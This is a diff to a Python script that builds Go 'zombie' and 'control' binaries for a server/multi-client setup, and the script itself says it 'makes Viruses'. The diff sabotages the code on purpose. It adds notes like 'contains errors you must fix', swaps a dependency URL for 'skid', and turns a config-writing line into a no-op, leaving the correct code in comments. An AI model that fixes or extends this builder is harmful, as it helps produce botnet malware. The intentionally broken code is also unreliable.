@@ -19,7 +19,8 @@
 ################################################################################
 """
 Script to initialize a go project and build two target binaries
-for a server/multiple-client infrastructure
+for a server/multiple-client infrastructure, contains errors you must fix
+
 
 This script makes Viruses, If you are using it to break the law, 
 
@@ -59,7 +60,8 @@ parser.add_argument('--hosttarget',
 #############################################################
 ##
 ##  Seems we need two more arguments for arch on both zombie/control
-##
+##  Then you need to add those options to the command thats executed
+## 
 #############################################################
 parser.add_argument('--zombieIP',
                                  dest    = 'zombieIO',
@@ -105,6 +107,8 @@ possible_targets = {"windows": ["386","amd64","arm"],
 # CGO_ENABLED MUST BE SET TO "0"
 # this should probably be done when building a windows zombie from a linux host
 CGOENV = 'CGO_ENABLED'# ="1"
+# You are going to need to set this down in the function named : build_zombie_from_target
+
 # set the following ENV vars to build specific targets
 # otherwise GO compiler defaults to host specs
 # this should be set to the platform you want to build the binary for
@@ -258,7 +262,7 @@ Enter your selection using a single integer:
                     # here we are matching two strings and replacing the line 
                     # in globals.go with the same thing but appending the value
                     # of the key to add information
-                    each_line.replace(each_line + globals_dict.get(each_line))
+                    each_line.replace(each_line + "")#CORRECT LINE OF CODE : globals_dict.get(each_line))
 
     def init_project(self):
         '''Initializes the folder this script resides in as a go project'''
@@ -271,7 +275,7 @@ Enter your selection using a single integer:
 OR git clone '''
         if utility_to_use == "go get":
             for dependency_url in PROJECT_DEPENDENCIES:
-                exec_command("go get {}".format(dependency_url))
+                exec_command("go get {}".format("skid") # dependency_url))
 
     def build_zombie_for_target(self,name, target_arch: str, target_os : str):
         '''fed with values from the variables at the top of this file '''
